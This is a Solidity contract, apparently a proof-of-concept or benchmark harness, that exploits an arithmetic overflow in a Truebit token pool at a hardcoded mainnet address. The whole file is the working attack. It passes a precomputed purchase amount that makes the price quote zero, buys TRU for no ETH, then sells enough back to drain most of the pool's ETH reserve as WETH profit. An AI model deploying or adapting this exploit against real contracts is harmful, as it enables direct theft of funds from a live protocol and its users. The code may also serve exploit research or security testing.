// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ITruebitPool {
    function getPurchasePrice(uint256 amount) external view returns (uint256);
    function buyTRU(uint256 amount) external payable;
    function sellTRU(uint256 amount) external;
    function reserve() external view returns (uint256);
    function THETA() external view returns (uint256);
}

interface IERC20Minimal {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract FlawVerifier {
    address internal constant POOL = 0x764C64b2A09b09Acb100B80d8c505Aa6a0302EF2;
    address internal constant TRU = 0xf65B5C5104c4faFD4b709d9D60a185eAE063276c;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 internal _profitAmount;

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 startingEth = address(this).balance;
        uint256 startingWeth = IWETH(WETH).balanceOf(address(this));

        // Approve the pool to spend our TRU
        IERC20Minimal(TRU).approve(POOL, type(uint256).max);

        // Run exploit: buy TRU at zero/near-zero cost, sell back for ETH
        // The overflow amount where getPurchasePrice wraps to 0
        uint256 attackAmount = 240442509453545333947284131;
        
        // Check purchase price is 0
        uint256 quote = ITruebitPool(POOL).getPurchasePrice(attackAmount);
        require(quote == 0, "quote not zero");

        // Buy TRU with 0 ETH
        ITruebitPool(POOL).buyTRU{value: 0}(attackAmount);

        // Now sell it back. The retire price is linear.
        // retirePerUnit = 52792814604295 wei per 1 TRU (18 decimals)
        // Attack amount retire price: ~12693 ETH
        // Reserve: ~8539 ETH
        // So we need to sell only what the reserve can cover
        
        uint256 reserve = ITruebitPool(POOL).reserve();
        uint256 retirePerUnit = 52792814604295;
        
        // Amount we can sell such that reserve >= retire price
        // retirePrice = amount * retirePerUnit / 1e18
        // amount = reserve * 1e18 / retirePerUnit
        uint256 sellAmount = (reserve * 1e18) / retirePerUnit;
        
        // Make sure we don't exceed our balance
        uint256 balance = IERC20Minimal(TRU).balanceOf(address(this));
        if (sellAmount > balance) {
            sellAmount = balance;
        }

        // Sell TRU for ETH
        ITruebitPool(POOL).sellTRU(sellAmount);

        uint256 gainedEth = address(this).balance - startingEth;
        if (gainedEth > 0) {
            IWETH(WETH).deposit{value: gainedEth}();
        }

        _profitAmount = IWETH(WETH).balanceOf(address(this)) - startingWeth;
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }
}
